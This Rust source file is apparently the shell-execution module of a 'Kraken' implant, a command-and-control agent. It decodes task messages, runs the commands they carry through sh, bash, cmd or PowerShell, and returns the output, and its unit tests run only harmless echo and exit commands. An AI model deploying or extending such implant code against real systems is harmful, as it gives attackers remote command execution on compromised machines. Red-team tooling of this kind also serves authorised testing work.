//! mod-shell: Shell command execution module for Kraken implant
//!
//! Provides shell command execution with multiple backend support:
//! - Linux: /bin/sh, /bin/bash
//! - Windows: cmd.exe, powershell.exe, pwsh.exe
//!
//! Features timeout handling and structured output capture.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::ShellTask;

mod execute;
pub mod pty;

pub struct ShellModule {
    id: ModuleId,
}

impl ShellModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("shell"),
        }
    }
}

impl Default for ShellModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ShellModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Shell"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ShellTask =
            ShellTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let output = execute::run_shell(&task)?;

        Ok(TaskResult::Shell(output))
    }
}

// For dynamic loading support (only emitted when building standalone dynamic module)
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(ShellModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = ShellModule::new();
        assert_eq!(module.id().as_str(), "shell");
        assert_eq!(module.name(), "Shell");
    }

    #[test]
    fn test_execute_simple_command() {
        let module = ShellModule::new();

        #[cfg(unix)]
        let task = ShellTask {
            command: "echo hello".to_string(),
            shell: None,
            timeout_ms: Some(5000),
        };

        #[cfg(windows)]
        let task = ShellTask {
            command: "echo hello".to_string(),
            shell: None,
            timeout_ms: Some(5000),
        };

        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);

        assert!(result.is_ok());
        if let Ok(TaskResult::Shell(output)) = result {
            assert!(output.stdout.contains("hello"));
            assert_eq!(output.exit_code, 0);
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_execute_failing_command() {
        let module = ShellModule::new();

        #[cfg(unix)]
        let task = ShellTask {
            command: "exit 42".to_string(),
            shell: None,
            timeout_ms: Some(5000),
        };

        #[cfg(windows)]
        let task = ShellTask {
            command: "exit /b 42".to_string(),
            shell: None,
            timeout_ms: Some(5000),
        };

        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);

        assert!(result.is_ok());
        if let Ok(TaskResult::Shell(output)) = result {
            assert_eq!(output.exit_code, 42);
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_execute_with_stderr() {
        let module = ShellModule::new();

        #[cfg(unix)]
        let task = ShellTask {
            command: "echo error >&2".to_string(),
            shell: Some("/bin/sh".to_string()),
            timeout_ms: Some(5000),
        };

        #[cfg(windows)]
        let task = ShellTask {
            command: "echo error 1>&2".to_string(),
            shell: None,
            timeout_ms: Some(5000),
        };

        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);

        assert!(result.is_ok());
        if let Ok(TaskResult::Shell(output)) = result {
            assert!(output.stderr.contains("error"));
        } else {
            panic!("unexpected result type");
        }
    }
}
